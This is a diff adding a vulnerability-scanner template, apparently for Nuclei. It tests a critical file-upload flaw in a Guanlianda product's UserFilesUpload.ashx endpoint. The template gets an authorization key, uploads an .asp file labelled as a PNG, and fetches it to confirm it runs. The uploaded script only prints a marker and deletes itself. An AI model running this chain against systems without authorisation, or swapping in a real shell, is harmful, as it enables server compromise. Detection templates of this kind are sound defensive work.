@@ -1,0 +1,79 @@
+id: guanlianda-fileupload-UserFilesUpload
+info:
+  name: guanlianda-fileupload-UserFilesUpload
+  author: codex
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  content: "{{to_lower(rand_base(20))}}"
+  boudary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |-
+        POST /Services/FileService/UserFiles/GetAuthorizeKey.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        SL-CE-SUID: 97
+        Content-Length: 45
+
+        destDir=./sysinfo/&destFilename={{filename}}.asp
+      - |-
+        POST /Services/FileService/UserFiles/UserFilesUpload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+        Content-Type: multipart/form-data; boundary=----{{boudary}}
+        Accept-Encoding: gzip
+        SL-CE-SUID: 97
+        Content-Length: 1029
+
+        ------{{boudary}}
+        Content-Disposition: form-data; name="destDir"
+
+        ./sysinfo/
+        ------{{boudary}}
+        Content-Disposition: form-data; name="destFilename"
+
+        {{filename}}.asp
+        ------{{boudary}}
+        Content-Disposition: form-data; name="key"
+
+        {{seckey}}
+        ------{{boudary}}
+        Content-Disposition: form-data; name="successUrl"
+
+        ~\sysinfo
+        ------{{boudary}}
+        Content-Disposition: form-data; name="overWrite"
+
+        true
+        ------{{boudary}}
+        Content-Disposition: form-data; name="FileData"; filename="{{filename}}.asp"
+        Content-Type: image/png
+
+        <% response.write("{{content}}")
+        set myfso=server.CreateObject("scripting.filesystemobject") 
+        myfso.DeleteFile(Server.MapPath("{{filename}}.asp"))%>
+        ------{{boudary}}--
+      - |+
+        @timeout: 8s
+        GET /UserFiles/sysinfo/{{filename}}.asp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    extractors:
+      - type: regex
+        name: seckey
+        group: 1
+        regex:
+          - 'key\:\"(\S*)\"'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_3, '{{content}}') && status_code==200"
